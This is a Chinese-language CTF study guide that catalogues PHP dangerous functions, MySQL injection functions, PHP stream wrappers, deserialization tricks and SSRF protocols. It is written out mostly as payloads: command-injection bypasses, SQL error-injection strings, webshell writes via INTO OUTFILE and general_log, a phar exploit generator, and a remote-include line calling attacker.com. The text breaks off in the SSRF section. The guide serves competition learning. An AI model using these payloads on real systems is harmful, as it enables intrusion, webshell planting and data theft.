---

title: CTF 比赛常用函数与漏洞全指南
tags: \[CTF, Web 安全, PHP, 危险函数, 漏洞利用, 代码审计, 竞赛]
date: 2024-07-08

---

# CTF 比赛常用函数与漏洞全指南

CTF（Capture The Flag）比赛的 Web 方向本质上是对代码审计和漏洞利用能力的考察。本文从函数出发，建立"函数 → 漏洞 → 利用"的知识图谱，覆盖 PHP/MySQL/系统命令三大维度中 CTF 最常见的危险函数、绕过技巧和利用套路。

本文的目标读者是已经有一定 Web 安全基础、希望系统化梳理 CTF 知识体系的选手。

## 第一章：PHP 危险函数全索引

### 1.1 命令执行类

CTF 中一旦发现以下函数且参数可控，99%意味着命令执行漏洞。

```php
// ====== 直接命令执行（高危） ======
system($cmd);           // 执行命令并直接输出结果（有回显）
exec($cmd, $output);    // 执行命令，结果存入$output数组（需手动输出）
shell_exec($cmd);       // 通过shell执行，返回完整输出字符串
passthru($cmd);         // 执行命令并直接输出原始结果
`$cmd`;                 // 反引号，等价于shell_exec()

// ====== 进程控制类 ======
popen($cmd, 'r');       // 打开进程文件指针（只读管道）
popen($cmd, 'w');       // 可写的进程管道
proc_open($cmd, $descriptorspec, $pipes);  // 更强的进程控制
pcntl_exec($path, $args);  // 当前进程替换为指定程序

// ====== 邮件相关（可能利用的） ======
mail($to, $subject, $message, $headers, $params);
// 第五个参数$params会被传入sendmail程序
// 常见payload: mail('','','','','-OQueueDirectory=/tmp -X/tmp/shell.php')
// 写入WebShell到/tmp/shell.php

// ====== 动态函数调用（伪装的RCE） ======
$func = $_GET['func'];
$func($arg);            // 动态函数调用 → system('whoami')

call_user_func($func, $arg);        // 回调函数
call_user_func_array($func, $args); // 回调函数（数组参数）
array_map($func, $array);           // 对数组每个元素调用函数
array_filter($array, $func);        // 用回调过滤数组
array_walk($array, $func);          // 遍历数组调用回调
register_shutdown_function($func);  // 注册退出时回调
register_tick_function($func);      // 注册tick回调

// ====== 正则/e修饰符（PHP < 5.5） ======
preg_replace('/pattern/e', $replacement, $subject);
// /e修饰符让replacement作为PHP代码执行
// 经典payload: preg_replace('/test/e', $_GET['cmd'], 'test');
// 利用: ?cmd=system('whoami')
// 复杂版本（需要从匹配中提取）:
// preg_replace("/(.*)/e", 'strtolower("\\1")', $input);
// → preg_replace("/.*/e", $_GET['cmd'], '');

// PHP 7.0+ 替代: preg_replace_callback()

// ====== 其他代码执行 ======
assert($code);          // PHP < 7.2: 对字符串执行eval
// assert('strpos("'.$input.'", "..") === false') 可注入
// 利用: $input = "'.system('ls').'"

eval($code);            // 直接执行PHP代码——最危险的函数
create_function($args, $code);
// 底层用eval创建匿名函数
// create_function('$a', $_GET['code'])
// → eval('function __lambda_func($a) {'.$_GET['code'].'}')
// 利用闭合花括号: ?code=}phpinfo();//
```

#### CTF 中命令执行函数的出现模式

    模式1: 直接的system($ip)
    题目: ping功能的网站 → system("ping -c 2 $ip")
    绕过: ; whoami / | whoami / && whoami

    模式2: 字符串替换后执行
    题目: $ip = str_replace(';', '', $_GET['ip']); system("ping $ip");
    绕过: || whoami / %0a whoami

    模式3: 白名单校验失误
    题目: 只允许数字和点 → 正则写错 → /^[0-9.]+$/
    绕过: 127.0.0.1%0awhoami (%0a不在数字和点范围但未完整匹配)

    模式4: 无参函数的eval
    题目: eval($_GET['code'])，但限制了括号内容
    特点: /[^\W]+\((?R)?\)/ 只允许 a(b(c())) 式调用
    绕过: 使用getallheaders()/get_defined_vars()/session_id()等

### 1.2 文件操作类

```php
// ====== 文件读取 ======
file_get_contents($filename);   // 读文件内容到字符串
readfile($filename);            // 读文件并输出到缓冲区
fread(fopen($filename, 'r'));   // 传统方式读文件
file($filename);                // 读文件到数组（每行一个元素）
show_source($filename);         // 语法高亮显示源码（同highlight_file）
highlight_file($filename);      // 同上

// ====== 文件写入 ======
file_put_contents($filename, $data);
fwrite(fopen($filename, 'w'), $data);
fputs($fp, $data);

// ====== 文件包含（CTF最核心考点之一） ======
include($file);
require($file);
include_once($file);
require_once($file);
// 关键点：即使后缀不是.php，include仍按PHP解析内容
// include('shell.txt') → txt中包含<?php xxx?> → 照样执行

// ====== 文件系统遍历 ======
scandir($dir);              // 列出目录
glob($pattern);             // 通配符匹配文件
opendir($dir); readdir();   // 传统读目录
dirname($path);             // 取目录名
basename($path);            // 取文件名
realpath($path);            // 解析为绝对路径
file_exists($path);         // 判断文件是否存在

// ====== 文件操作（间接利用） ======
copy($source, $dest);       // 复制文件（可用来移动上传的马）
rename($old, $new);         // 重命名（.jpg → .php）
unlink($file);              // 删除文件
mkdir($dir);                // 创建目录
chmod($file, $perm);        // 修改权限
chown($file, $user);        // 修改所有者
symlink($target, $link);    // 创建符号链接
```

#### 文件相关的 CTF 常见套路

    套路1: include($file) + 伪协议
    利用: ?file=php://filter/convert.base64-encode/resource=flag.php
          读源码 → base64解码 → 拿到flag

    套路2: file_put_contents + 目录穿越
    class Log { function __destruct() { file_put_contents($this->file, $this->data); } }
    利用: file=../shell.php, data=<?php eval($_POST[1]);?>

    套路3: copy/rename 改后缀
    上传shell.jpg → copy('shell.jpg', 'shell.php') → 执行

### 1.3 字符串处理类

CTF 中字符串处理函数往往出现在 WAF 绕过和编码/解码题目中。

```php
// ====== 字符串替换与过滤 ======
str_replace($search, $replace, $subject);   // 只替换一次就停？→ NO，全部替换
preg_replace($pattern, $replacement, $subject);
preg_filter($pattern, $replacement, $subject);
str_ireplace($search, $replace, $subject);  // 不区分大小写
trim($str);           // 去首尾空白
ltrim($str);          // 去左侧空白
rtrim($str);          // 去右侧空白
strip_tags($str);     // 去HTML/PHP标签
addslashes($str);     // 对' " \ NULL加反斜杠（绕过：宽字节/二次编码）
stripcslashes($str);  // 去掉addslashes加的斜杠
quotemeta($str);      // 对 . \ + * ? [ ^ ] ( $ ) 加反斜杠

// ====== 字符串截取（常出现在提取/限制题型） ======
substr($str, $start, $length);
mb_substr($str, $start, $length);  // 多字节安全
strstr($str, $needle);             // 查找并返回从needle到结尾
stristr($str, $needle);            // 不区分大小写
strtok($str, $token);              // 按token分割
explode($delimiter, $str);         // 分割为数组
implode($glue, $array);            // 数组拼接为字符串
join($glue, $array);               // 同implode

// ====== 特殊转换 ======
sprintf($format, $args...);        // 格式化字符串
// SQL注入中可用sprintf做宽字节
printf($format, $args...);         // 同上但直接输出

chr($ascii);          // ascii → 字符
ord($char);           // 字符 → ascii
strtolower($str);     // 转小写
strtoupper($str);     // 转大写
ucfirst($str);        // 首字母大写
ucwords($str);        // 每个单词首字母大写

// ====== HTML/URL编解码 ======
htmlspecialchars($str);     // 转义HTML特殊字符
htmlentities($str);         // 转义所有HTML实体
urlencode($str);            // URL编码
urldecode($str);            // URL解码
rawurlencode($str);         // RFC 3986编码 (空格转%20而非+)
rawurldecode($str);
base64_encode($data);       // Base64编码
base64_decode($data);       // Base64解码

// ====== 序列化相关 ======
serialize($var);            // 序列化
unserialize($str);          // 反序列化 ← CTF核心考点
// phar:// 伪协议也会触发反序列化（phar文件metadata部分）
```

#### 字符串函数的 CTF 挖坑点

```php
// 坑1: str_replace只替换一次？NO - 它替换所有！
// 防御: str_replace('..', '', $input) 看似安全
// 绕过: .... → 替换成 ..
// 绕过: ..././  → str_replace处理一次后变成 ../
// 但注意str_replace不是循环替换！双写绕过是因为逻辑有漏洞

// 坑2: trim系列不递归
trim($str, '.');   // 去掉首尾的点
// 防御: trim($filename, '.') 防止shell.php.
// 绕过: shell.php. . (中间空格 → Windows会忽略)

// 坑3: addslashes不是万能的
// 宽字节注入: 当数据库编码为GBK
// %df' → addslashes → %df\' → GBK解码 → %df%5c成一个汉字 → '逃逸
// 所以要用mysql_real_escape_string + SET NAMES 'binary'

// 坑4: strip_tags的漏洞
// strip_tags('<a<?php phpinfo(); ?> href="">')  → <?php phpinfo(); ?>保留
// 因为 strip_tags 只去除HTML成对标签，PHP标签不在其范围内

// 坑5: parse_str的变量覆盖
parse_str($_SERVER['QUERY_STRING'], $result);
// 或更危险的: parse_str($_GET['data']); 直接注册为全局变量
// 可以覆盖已有的变量实现变量覆盖攻击
```

### 1.4 类型与比较类

PHP 的弱类型比较是 CTF 中一个独特的考点。

```php
// ====== 类型转换 ======
intval($var);
floatval($var);
strval($var);
settype($var, $type);
(bool) $var;   (int) $var;   (string) $var;

// ====== 比较操作符的坑 ======
// == 弱比较 (Loose Comparison)
// === 强比较 (Strict Comparison)

// 经典弱比较绕过:
"admin" == 0         → true   (字符串转数字=0 == 0)
"1admin" == 1        → true   (字符串头部数字=1 == 1)
"0e123456" == "0e654321" → true   (科学计数法, 0的N次方都是0)
"0e123456" == 0      → true   (同上)

// 常用0e开头的md5值（用于弱比较绕过）:
// QNKCDZO    → md5 = 0e830400451993494058024219903391
// 240610708  → md5 = 0e462097431906509019562988736854
// s878926199a → md5 = 0e545993274517709034328855841020
// s155964671a → md5 = 0e342768416822451524974117254469
// s214587387a → md5 = 0e848240448830537924465865611904

// MD5强比较绕过（===）:
// 方法一: 数组绕过
// md5(array()) → NULL → NULL === NULL → true
// ?a[]=1&b[]=2 → 都传数组

// 方法二: 使用快速MD5碰撞的二进制文件
// 下载碰撞好的两个内容不同但md5相同的文件

// ====== 类型比较函数 ======
isset($var);           // 变量是否已设置且非NULL
empty($var);           // 变量是否为"空"值
// empty的"空": 0, '', '0', false, null, array(), 未定义
// 坑: empty("0") → true (很多人踩的坑)

is_numeric($var);      // 是否是数字或数字字符串
// 坑: is_numeric("0x1A") → true (十六进制)
// 坑: is_numeric(" 123 ") → true (空格不影响)

is_string($var);       // 是否字符串
is_array($var);        // 是否数组
is_object($var);       // 是否对象
is_null($var);         // 是否NULL
is_bool($var);         // 是否布尔值

// ====== 弱类型比较大全表 ======
// 在PHP中 == 的结果:
"abc" == 0          → true
"1abc" == 1         → true
"abc" == "abc"      → true (正常)
"abc" == "ABC"      → false (== 区分大小写)
"abc" == true       → true
"0" == false        → true
"0" == "0"          → true
"0" == 0            → true
"" == false         → true
"" == 0             → true
"" == null          → true
null == false       → true
null == 0           → true
array() == false    → true
array() == null     → true
"php" == 0          → true  ← 最常被利用!
"0e..." == "0e..."  → true  ← 科学计数法0^N=0

// 特别注意! PHP 8.0 修复了字符串和数字的弱比较行为:
// PHP 8.0: "abc" == 0 → false  (不再自动类型转换)
// 所以CTF题目要看清PHP版本
```

#### is_numeric 的绕过

```php
// CTF中常见的is_numeric校验绕过
if(is_numeric($input)) {
    $sql = "SELECT * FROM users WHERE id = $input";
}

// 绕过:
// 1. 十六进制(仅PHP 5.x部分版本)
// ?id=0x31206F7220313D31  → 实际是 "1 OR 1=1"

// 2. 科学记数法(但无法直接注入)
// ?id=1e1 → 等同于10

// 3. 空格+数字（trim缺失时）
// ?id= 1 or 1=1  → is_numeric返回false
// 但如果前面没trim就直接拼SQL...

// 4. 换行符+数字
// ?id=1%0aand%0asleep(5) → is_numeric误判
```

### 1.5 正则表达式类

```php
// ====== 正则函数 ======
preg_match($pattern, $subject);         // 匹配一次
preg_match_all($pattern, $subject);     // 全局匹配
preg_replace($pattern, $replacement, $subject);
preg_filter($pattern, $replacement, $subject);
preg_split($pattern, $subject);         // 正则分割
preg_grep($pattern, $array);            // 正则过滤数组

// ====== preg_match的绕过大全 =====
// 场景: if(preg_match('/flag/i', $input)) { die('No!'); }

// 1. 数组绕过(preg_match无法处理数组，返回false且报错)
// ?input[]=flag

// 2. 换行符绕过（/m修饰符未设置时，.不匹配\n，但这不是主要问题）
// 关键: 没有^$定界时，跨行可以绕过
// 如: /flag/ 不检查开始结束，只要有flag就行
// 但通常要配合^

// 3. PCRE回溯次数耗尽绕过（经典！）
// PHP的pcre.backtrack_limit默认1000000
// 构造100万+字符的payload让preg_match因回溯耗尽返回false
// 实际效果: preg_match返回false → 被当作"不匹配" → 绕过
// 工具: import requests
// payload = 'a' * 1000000 + '<?php system("cat /flag");?>'
// ?input=aaaaa...[100万次]...<?php...
// preg_match处理超长输入 → 回溯超限 → 返回false而非匹配结果
// → 绕过WAF的实际防线

// 4. 特殊字符绕过
// preg_match('/^[a-z]+$/', $input)
// 换行: %0a 可能让部分字符通过

// 5. ReDoS (正则拒绝服务)
// 构造让正则回溯极其缓慢的输入
// 如: preg_match('/(a+)+b/', 'aaaaa...') ← 嵌套量词 + 长匹配串

// 6. 编码绕过
// 如果preg_match检查原始输入，但后续做了urldecode...
// 先传两次编码: %25 → urldecode → %27 → SQL注入
```

### 1.6 变量与符号类

```php
// ====== 变量相关（CTF特殊考点） ======
$$var;                      // 可变变量
// $a = 'b'; $b = 'flag'; echo $$a; → 输出 'flag'
// 可用来绕过黑名单

extract($array);            // 从数组导入变量到符号表
// extract($_GET); → 可以覆盖任意已定义变量
// 经典: 覆盖$auth=true 或 $is_admin=1

parse_str($str, &$array);   // 解析查询字符串
// 注意: 不传第二个参数的parse_str会直接注册为全局变量!
parse_str($_SERVER['QUERY_STRING']);
// ?GLOBALS[flag]=123 → $GLOBALS被污染

compact($varnames);         // 将变量名数组合并为关联数组
// compact('flag', 'config'); → ['flag'=>..., 'config'=>...]

get_defined_vars();         // 返回所有已定义变量
// 无参RCE中用来获取变量（因为在函数作用域内返回所有变量）

// ====== 变量覆盖的典型题目 ======
// 场景1: extract
$a = 'safe_value';  // 预设值
extract($_GET);      // GET传入a=evil → $a被覆盖
echo $a;             // 输出evil

// 场景2: parse_str
$config = ['admin'=>false];
parse_str($_SERVER['QUERY_STRING']);
// ?config[admin]=true → $config被覆盖

// 场景3: import_request_variables (PHP 4.x ~ 5.3)
// 已废弃，但老题目中出现
// import_request_variables('G'); → 所有GET变量注册为全局

// 场景4: $$ 变量覆盖
$key = $_GET['key'];
$$key = $_GET['value'];
// ?key=auth&value=true → $auth = true
// 后面 if($auth) → 通过认证

// ====== 超全局变量 ======
$_GET       // URL参数
$_POST      // POST数据
$_REQUEST   // 合并GET+POST+COOKIE（顺序由request_order决定）
$_COOKIE    // Cookie
$_SESSION   // 会话
$_SERVER    // 服务器和执行环境信息
$_ENV       // 环境变量
$_FILES     // 文件上传
$GLOBALS    // 所有全局变量的引用
// 注意: register_globals=on时（PHP < 5.4）
// GET参数直接注册为变量: ?admin=1 → $admin=1
```

### 1.7 Session 与 Cookie

```php
// ====== Session函数 ======
session_start();                    // 开启session
session_id($id);                    // 获取/设置session ID
session_name($name);                // 获取/设置session名
session_save_path($path);           // 获取/设置session存储路径
session_destroy();                  // 销毁session

// ====== CTF中的Session利用 ======
// 1. session.upload_progress 利用（PHP 5.4+）
// 条件: session.upload_progress.enabled = On (默认)
// 原理: 上传文件时PHP会在session中写入进度数据
// 如果session存储路径已知且可控文件名
// → 通过文件名注入PHP代码 → include session文件 → 代码执行

// 利用脚本:
import requests
files = {'file': ('a.txt', 'test')}
data = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat /flag");?>'
}
# 同时上传+竞争条件读取session文件

// 2. session反序列化
// session.serialize_handler 可以是 php|php_serialize|php_binary
// 不同处理器对session数据的编码方式不同
// 如果题目在不同处理器间切换 → 可能造成反序列化漏洞

// 3. session_id()在无参RCE中的妙用
// session_id(session_start()) → 返回当前session_id
// hex2bin(session_id(session_start())) → hex解码session_id
// eval(hex2bin(session_id(session_start()))) → 执行PHPSESSID中的PHP代码
// 在Cookie中设置: PHPSESSID=6576616c28245f504f53545b315d293b
// (hex of: eval($_POST[1]);)
```

---

## 第二章：MySQL 注入函数大全

### 2.1 核心注入函数速查

```sql
-- ====== 信息函数 ======
VERSION()              -- MySQL版本
@@VERSION              -- 同上
USER()                 -- 当前用户
CURRENT_USER()         -- 当前有效用户
SYSTEM_USER()          -- 系统用户
SESSION_USER()         -- 会话用户
DATABASE()             -- 当前数据库
SCHEMA()               -- 同DATABASE()
@@DATADIR              -- 数据文件路径
@@BASEDIR              -- MySQL安装路径
@@HOSTNAME             -- 主机名
@@VERSION_COMPILE_OS   -- 编译操作系统
UUID()                 -- 生成UUID（随机数，盲注中判断是否执行）

-- ====== 字符串函数（注入用） ======
CONCAT(str1, str2, ...)           -- 拼接字符串
CONCAT_WS(sep, str1, str2, ...)   -- 带分隔符拼接
GROUP_CONCAT(col)                 -- 多行拼接为一行（盲注核心函数）
LENGTH(str)                       -- 字符串长度（字节数）
CHAR_LENGTH(str)                  -- 字符串长度（字符数，多字节安全）
SUBSTR(str, pos, len)             -- 截取子串
SUBSTRING(str, pos, len)          -- 同SUBSTR
MID(str, pos, len)                -- 同SUBSTR
LEFT(str, len)                    -- 从左截取
RIGHT(str, len)                   -- 从右截取
LOCATE(needle, str)               -- 查找子串位置
POSITION(needle IN str)           -- 同LOCATE
INSTR(str, needle)                -- 同LOCATE
REVERSE(str)                      -- 反转字符串
REPLACE(str, from, to)            -- 替换
REPEAT(str, count)                -- 重复字符串
LPAD(str, len, pad)               -- 左填充
RPAD(str, len, pad)               -- 右填充
TRIM(str)                         -- 去首尾空格
LTRIM(str)                        -- 去左空格
RTRIM(str)                        -- 去右空格
UPPER(str)                        -- 大写
LOWER(str)                        -- 小写

-- ====== 转换函数 ======
ASCII(char)                       -- 字符→ASCII（盲注核心）
ORD(char)                         -- 同ASCII
CHAR(ascii, ...)                  -- ASCII→字符（绕过引号过滤）
HEX(str)                          -- 字符串→十六进制
UNHEX(hex)                        -- 十六进制→字符串
BIN(num)                          -- 数字→二进制
OCT(num)                          -- 数字→八进制
CONV(num, from_base, to_base)     -- 进制转换
CAST(expr AS type)                -- 类型转换
CONVERT(expr, type)               -- 类型转换

-- ====== 条件与延时函数 ======
IF(condition, true_val, false_val)   -- 条件判断（布尔盲注核心）
CASE WHEN condition THEN val END     -- CASE WHEN条件
SLEEP(sec)                           -- 延时（时间盲注核心）
BENCHMARK(count, expr)               -- 重复执行表达式（替代sleep）
GET_LOCK(str, timeout)               -- 获取命名锁（延时/盲注信号）
IS_FREE_LOCK(str)                    -- 检查锁状态
IFNULL(expr, val)                    -- NULL替换
NULLIF(expr1, expr2)                 -- 相等返回NULL
COALESCE(expr, ...)                  -- 返回第一个非NULL

-- ====== 聚合函数 ======
COUNT(*)                             -- 计数
COUNT(DISTINCT col)                  -- 去重计数
SUM(col)                             -- 求和
AVG(col)                             -- 平均
MIN(col)                             -- 最小值
MAX(col)                             -- 最大值

-- ====== 数学函数（报错注入用） ======
FLOOR(x)                             -- 向下取整（floor报错）
RAND([seed])                         -- 随机数（floor报错关键）
EXP(x)                               -- e^x（EXP溢出报错）
POW(x, y)                            -- x^y
SQRT(x)                              -- 平方根
```

### 2.2 报错注入函数组合

```sql
-- ====== 报错注入完整payload库 ======

-- 1. floor + rand + group by (最经典)
SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x
FROM information_schema.tables GROUP BY x)a

-- 2. extractvalue (32字符限制)
AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))

-- 3. updatexml (32字符限制)
AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

-- 4. EXP溢出 (MySQL <= 5.5.48)
AND exp(~(SELECT * FROM(SELECT user())a))

-- 5. BIGINT溢出
AND (SELECT * FROM (SELECT ~0+!(SELECT * FROM(SELECT user())x))a)

-- 6. geometrycollection
AND geometrycollection((SELECT * FROM(SELECT user())a))

-- 7. polygon
AND polygon((SELECT * FROM(SELECT user())a))

-- 8. multipoint
AND multipoint((SELECT * FROM(SELECT user())a))

-- 9. multilinestring
AND multilinestring((SELECT * FROM(SELECT user())a))

-- 10. linestring
AND linestring((SELECT * FROM(SELECT user())a))

-- 11. multipolygon
AND multipolygon((SELECT * FROM(SELECT user())a))
```

### 2.3 information_schema 替代方案

```sql
-- ====== 当information_schema被禁用时 ======

-- 1. MySQL 5.6+ innodb内表
SELECT table_name FROM mysql.innodb_table_stats
WHERE database_name = database()

SELECT table_name FROM mysql.innodb_index_stats
WHERE database_name = database()

-- 2. MySQL 5.7+ sys库
SELECT table_name FROM sys.schema_table_statistics
WHERE table_schema = database()
SELECT table_name FROM sys.x$schema_flattened_keys
SELECT table_name FROM sys.schema_auto_increment_columns
WHERE table_schema = database()

-- 3. 无列名注入
SELECT `1` FROM (SELECT 1,2 UNION SELECT * FROM users)a LIMIT 1,1
SELECT (SELECT group_concat(`1`) FROM (SELECT 1,2,3 UNION SELECT * FROM users)a)
-- 逐列读取: `1`, `2`, `3` 分别对应第一、二、三列

-- 4. 自然Join爆列名
SELECT * FROM users JOIN (SELECT 1 AS `id`)b

-- 5. PROCEDURE ANALYSE（MySQL < 5.7）
SELECT * FROM users PROCEDURE ANALYSE()
-- 在报错信息中会显示列名
```

### 2.4 MySQL 读写文件函数

```sql
-- ====== 读文件 ======
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- 条件:
-- 1. 用户有FILE权限
-- 2. secure_file_priv = '' (或包含目标路径)
-- 3. 文件可读且小于 max_allowed_packet
-- 4. 知道文件的绝对路径

-- 检查secure_file_priv
SELECT @@secure_file_priv;
-- NULL  → 禁止读写
-- ''    → 无限制
-- '/path/' → 限制在该路径

-- ====== 写文件（写WebShell） ======
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT 0x3C3F706870206576616C28245F504F53545B315D293B3F3E
    INTO OUTFILE '/var/www/html/shell.php'

-- 联合查询写入
UNION SELECT 1,'<?php @eval($_POST[1]);?>',3
INTO OUTFILE '/var/www/html/shell.php'

-- ====== 写文件备用方案 ======
-- 1. general_log写shell
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php @eval($_POST[1]);?>';
SET GLOBAL general_log = 'OFF';

-- 2. slow_query_log写shell
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';
SELECT '<?php @eval($_POST[1]);?>' FROM mysql.user WHERE sleep(11);
```

---

## 第三章：PHP 伪协议全解

CTF 中伪协议是必考内容，涉及文件包含、RCE、反序列化。

### 3.1 伪协议速查表

```php
// ====== php:// 系列 ======

// php://input - 读取POST原始数据
// 配合文件包含实现RCE
include('php://input');
// POST: <?php system('whoami');?>

// php://filter - 文件内容过滤器（CTF最常用！）
// 读源码
include('php://filter/convert.base64-encode/resource=flag.php');
include('php://filter/read=convert.base64-encode/resource=index.php');

// 写文件（结合file_put_contents）
file_put_contents('php://filter/write=convert.base64-decode/resource=shell.php',
    'PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==');

// 链式过滤器（多层编码）
include('php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16/resource=flag.php');
include('php://filter/string.rot13/resource=flag.php');
include('php://filter/convert.iconv.utf-8.utf-7/resource=flag.php');

// php://filter的可用过滤器列表:
// string.rot13          - ROT13编码
// string.toupper        - 转大写
// string.tolower        - 转小写
// string.strip_tags     - 去除HTML/PHP标签 ← 注意! 可能会删掉flag内容
// convert.base64-encode - Base64编码
// convert.base64-decode - Base64解码
// convert.iconv.*       - 字符集转换
// convert.quoted-printable-encode/decode
// zlib.deflate / zlib.inflate - 压缩/解压
// bzip2.compress / bzip2.decompress - bzip2压缩/解压

// php://output / php://stdout / php://stderr
// 直接写入输出流

// php://memory 和 php://temp
// 临时数据存储（利用较少）

// ====== file:// ======
include('file:///etc/passwd');
include('file:///var/www/html/flag.php');
// 绝对路径读文件

// ====== data:// ======
// 直接内联数据（无需外部文件）
include('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==');
include('data://text/plain,<?php phpinfo();?>');
include('data:,<?php phpinfo();?>');

// ====== phar:// ======
// 反序列化利器！不需要unserialize()
include('phar://uploads/shell.jpg/test.txt');
file_get_contents('phar://uploads/shell.jpg/test.txt');
// phar文件格式中包含序列化的metadata
// 任何接受phar://的文件操作函数都会触发反序列化
// 可以触发反序列化的函数清单:
// file_exists, file_get_contents, fopen, include, file, file_put_contents
// is_dir, is_file, is_link, stat, lstat, filemtime, filesize
// readfile, opendir, scandir, copy, rename, unlink, mkdir, rmdir ...

// ====== zip:// / bzip2:// / zlib:// ======
include('zip://uploads/shell.jpg%23shell.php');
// zip://path/to/zipfile#internal_file_path
// # 需要URL编码为 %23

include('compress.bzip2://uploads/shell.bz2');
include('compress.zlib://uploads/shell.gz');

// ====== expect:// ======
// 需要安装expect扩展
include('expect://whoami');
include('expect://id');

// ====== http:// / https:// / ftp:// ======
// 远程文件包含 (RFI) - 需要allow_url_include = On
include('http://attacker.com/shell.txt');

// ====== glob:// ======
// 文件系统通配符匹配
$files = glob('glob:///var/www/*.php');

// ====== ssh2:// / ogg:// / rar:// ======
// 协议封装（特殊场景）
// ssh2://user:pass@host:22/path
// rar://path/to/file.rar#file.txt
// ogg://soundfile.ogg  (audio stream)
```

### 3.2 死亡绕过（die/exit 后的代码执行）

这是 CTF 高级考点：当代码中`include($file)`但文件头部有`<?php die('no');?>`时如何绕过。

    死亡绕过场景：
    flag.php 内容:
    <?php die('Access Denied!');?>
    flag{this_is_the_real_flag}

    直接include('flag.php') → 输出"Access Denied!"后就die了
    但die('xxx')中执行完就不往下执行了

    绕过思路:
    利用php://filter的链式处理

    方法1: php://filter/convert.base64-decode/resource=flag.php
    如果对Base64解码无效字符会跳过，可以去掉<?php die()
    需要构造编码使<?php die()部分在Base64解码后变成乱码被丢弃

    方法2: php://filter/string.strip_tags/resource=flag.php
    strip_tags可以去掉<?php die()?>标签
    但也会去掉flag中的HTML标签

    方法3: php://filter/string.rot13/resource=flag.php
    ROT13编码让所有字母字母偏移13位
    die → qvr（不执行）
    然后用 rot13解码获取原始内容

    方法4: convert.iconv.utf-8.utf-16
    字符集转换可能导致乱码，使PHP解析器跳过die部分

    方法5: 使用编码链
    php://filter/convert.base64-encode|convert.iconv.UTF8.UTF7/resource=flag.php
    先base64编码再转字符集，结果可能绕过die

---

## 第四章：CTF 常见漏洞类型全索引

### 4.1 PHP 反序列化漏洞

CTF 中 PHP 反序列化是最深奥的考点，涉及 POP 链构造、phar 反序列化、session 反序列化等。

#### 关键魔术方法触发顺序

    unserialize() 触发顺序:

    1. __wakeup()       ← unserialize后立即调用
    2. 对象属性被还原
    3. __destruct()     ← 所有代码执行完毕或对象被销毁时
    4. __toString()     ← 对象被当作字符串使用时（echo/strval/.）
    5. __call()         ← 调用不存在的方法时
    6. __get()          ← 访问不存在的属性时
    7. __set()          ← 给不存在的属性赋值时
    8. __invoke()       ← 对象被当作函数调用时
    9. __sleep()        ← serialize()前（序列化时）
    10. __clone()       ← 使用clone关键字时
    11. __isset()       ← 对不存在的属性调用isset/empty时
    12. __unset()       ← 对不存在的属性调用unset时
    13. __debugInfo()   ← var_dump时
    14. __set_state()   ← var_export时
    15. __serialize()   ← PHP 7.4+ 替代__sleep()
    16. __unserialize() ← PHP 7.4+ 替代__wakeup()

#### POP 链构造思路

    POP链构造步骤:
    1. 从所有类的__destruct()开始
    2. 跟踪调用了哪些方法 → 哪些对象属性可控
    3. 从目标类的方法中找危险函数
       - file_put_contents → 写WebShell
       - system/exec → 命令执行
       - file_get_contents → 读文件
       - eval/assert → 代码执行
    4. 如果当前类的__destruct不直接到危险函数
       → 找链条中其他类的__toString/__call/__get等
       → 层层传递直到危险函数
    5. 构造最终的POP链序列化串

#### phar 反序列化（免 unserialize 的 RCE）

```php
<?php
// ====== 第一步: 生成phar文件 ======
class Exploit {
    public $cmd = 'system("cat /flag");';

    function __destruct() {
        eval($this->cmd);  // 危险函数
    }
}

// 创建phar
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
// 设置metadata（会被序列化存储）
$phar->setMetadata(new Exploit());
$phar->stopBuffering();

// 重命名为.jpg绕过上传白名单
rename('exploit.phar', 'exploit.jpg');

// ====== 第二步: 在目标服务器触发 ======
// 任何接受phar://的文件操作函数都会反序列化metadata:
file_get_contents('phar://exploit.jpg');
// 不需要unserialize()，不需要include
// 只要文件操作函数接受phar://协议
```

#### 绕过\_\_wakeup 的技巧

```php
// CVE-2016-7124: PHP < 5.6.25 / < 7.0.10
// 序列化字符串中对象的属性个数 > 实际属性个数
// → __wakeup()被跳过

// 原始:
// O:7:"Exploit":1:{s:3:"cmd";s:10:"phpinfo();";}
// 修改属性个数:
// O:7:"Exploit":2:{s:3:"cmd";s:10:"phpinfo();";}
//                                    ↑ 属性数改为2 → __wakeup被跳过

// 其他版本绕__wakeup:
// PHP 5.6.24+
// 使用CVE-2016-7124变体
// 或使用Serializable接口的unserialize()

// PHP 7.4+
// __unserialize()取代了__wakeup()
// 但可以利用其他魔术方法的顺序
```

#### 字符逃逸

```php
// 场景: 序列化前做了字符替换
// 如: str_replace('a', 'bb', serialize($data));
// 'a' → 'bb' 增加了1个字符

// 利用思路:
// 1. 让我们引入的字符串长度与实际不匹配
// 2. 利用替换造成的变化"吞噬"引号，逃逸出字符串
// 3. 注入我们控制的序列化属性

// 经典字符逃逸题:
// filter: str_replace('x', 'yy', $input);  // 1字符→2字符
// 原始序列化:
// a:2:{s:4:"name";s:6:"xxxxxx";s:3:"age";s:2:"20";}
// 注入30个x → 替换后变成60个y → 实际字符串长度远于声明
// 注入的payload: xxxxxx...（精心计算数量）
// ";s:4:"pass";s:4:"hack";}
// 完整: 30x + 构造的关闭引号串
// 替换后s:6:"30个x"变成s:6:"60个y"+"hack";}后的内容
// → 注入的属性被反序列化
```

### 4.2 SSRF 漏洞协议利用

```php
// SSRF常用协议参考卡

// === dict:// → 端口探测 ===
dict://127.0.0.1:3306     # 测试MySQL端口
dict://127.0.0.1:6379     # 测试Redis端口
dict://127.0.0.1:22       # 测试SSH端口
// 如果端口开放: dict会发命令并返回响应
// 如果端口关闭: 连接失败

// === gopher:// → 封装任意TCP（万能协议） ===
// 格式: gopher://IP:PORT/_TCP数据(URL编码)
